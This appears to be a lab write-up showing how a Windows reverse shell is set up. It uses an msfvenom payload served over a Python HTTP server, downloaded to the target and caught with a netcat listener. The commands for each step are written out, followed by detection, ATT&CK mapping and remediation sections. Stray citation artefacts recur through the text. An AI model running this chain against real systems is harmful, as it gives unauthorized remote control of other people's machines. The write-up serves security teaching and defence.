# Msfvenom Reverse Shell

## Objective

Demonstrate how a reverse shell can be established between a Windows target and a Kali Linux attacker machine using a payload generated with Msfvenom.

## Lab Environment

- Attacker Machine: Kali Linux
- Target Machine: Windows 10
- Tool Used: Msfvenom
- Communication Method: Reverse TCP Connection

## Msfvenom Overview

Msfvenom is a payload generation tool included with the Metasploit Framework. It allows security professionals to create custom payloads for penetration testing, red team operations, and exploit development.

Msfvenom supports multiple operating systems, payload formats, encoders, and architectures, making it a widely used post-exploitation tool.

## Payload Generation

A Windows reverse shell payload was generated using Msfvenom on the Kali Linux attacker machine. :contentReference[oaicite:0]{index=0}

### Commands Used

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Kali-IP> LPORT=8080 -f exe -o reverse.exe
```

### Findings

- Reverse shell payload generated successfully.
- Windows executable created.
- Payload prepared for delivery to the target system.

## HTTP Server Setup

A Python HTTP server was started on Kali Linux to host the generated payload. :contentReference[oaicite:1]{index=1}

### Commands Used

```bash
python2 -m SimpleHTTPServer 80
```

### Findings

- HTTP server started successfully.
- Payload became accessible from the target machine.

## Payload Transfer

The payload was downloaded from Kali Linux to the Windows target system. :contentReference[oaicite:2]{index=2}

### Commands Used

```powershell
wget http://<Kali-IP>/reverse.exe -o rv.exe

dir
```

### Findings

- Payload downloaded successfully.
- Executable stored on the target system.
- File integrity verified through directory listing.

## Listener Setup

A Netcat listener was configured on Kali Linux to receive incoming reverse shell connections. :contentReference[oaicite:3]{index=3}

### Commands Used

```bash
nc -lvp 8080
```

### Findings

- Listener started successfully.
- Kali Linux was ready to receive reverse shell connections.

## Reverse Shell Execution

The generated payload was executed on the Windows target system. :contentReference[oaicite:4]{index=4}

### Commands Used

```powershell
.\rv.exe
```

### Findings

- Reverse shell connection established successfully.
- Remote command execution became available.
- Windows command prompt access obtained.

## Remote Access Verification

The attacker machine received the reverse shell connection and verified access to the target system. :contentReference[oaicite:5]{index=5}

### Verification Commands

```cmd
whoami
hostname
```

### Findings

- Remote access confirmed.
- Command execution validated.
- Communication channel established between attacker and target.

## Attack Workflow

1. Generate a Windows reverse shell payload using Msfvenom.
2. Host the payload on Kali Linux using a Python HTTP server.
3. Download the payload on the Windows target.
4. Configure a Netcat listener on the attacker machine.
5. Execute the payload on the target system.
6. Establish a reverse TCP connection.
7. Verify remote access through command execution.

## Detection Opportunities

Security teams can identify Msfvenom payload activity through:

- Suspicious executable downloads
- Unusual outbound network connections
- Endpoint Detection and Response (EDR) alerts
- Execution of unknown binaries
- Command shell processes spawned by executables
- Antivirus and behavioral detection alerts
- Network traffic associated with reverse shells

## MITRE ATT&CK Mapping

| Technique ID | Technique |
|-------------|-----------|
| T1105 | Ingress Tool Transfer |
| T1204 | User Execution |
| T1071 | Application Layer Protocol |
| T1059.003 | Windows Command Shell |
| T1021 | Remote Services |

## Security Impact

Msfvenom payloads can provide attackers with remote command execution capabilities and establish persistent access to compromised systems.

### Potential Risks

- Unauthorized remote access
- Command execution
- Data theft
- Lateral movement
- Persistence opportunities
- Privilege escalation opportunities

## Remediation

- Restrict execution of unauthorized binaries.
- Implement application whitelisting.
- Monitor executable downloads from untrusted sources.
- Enable Endpoint Detection and Response (EDR).
- Monitor outbound network traffic.
- Deploy antivirus and behavioral detection controls.
- Educate users regarding suspicious executable files.

## Tools Used

- Msfvenom
- Netcat
- Python HTTP Server
- Kali Linux
- Windows 10

## Key Learning

This lab demonstrated how Msfvenom can be used to generate custom reverse shell payloads and establish remote command execution on a target system.

The exercise reinforced concepts related to payload generation, payload delivery, post-exploitation activities, reverse shell communications, and detection opportunities associated with malicious executable files.

Additionally, the lab highlighted the importance of monitoring executable downloads, process creation events, and outbound network connections within enterprise environments.

## Disclaimer

This assessment was conducted in a controlled lab environment for educational and ethical security testing purposes only.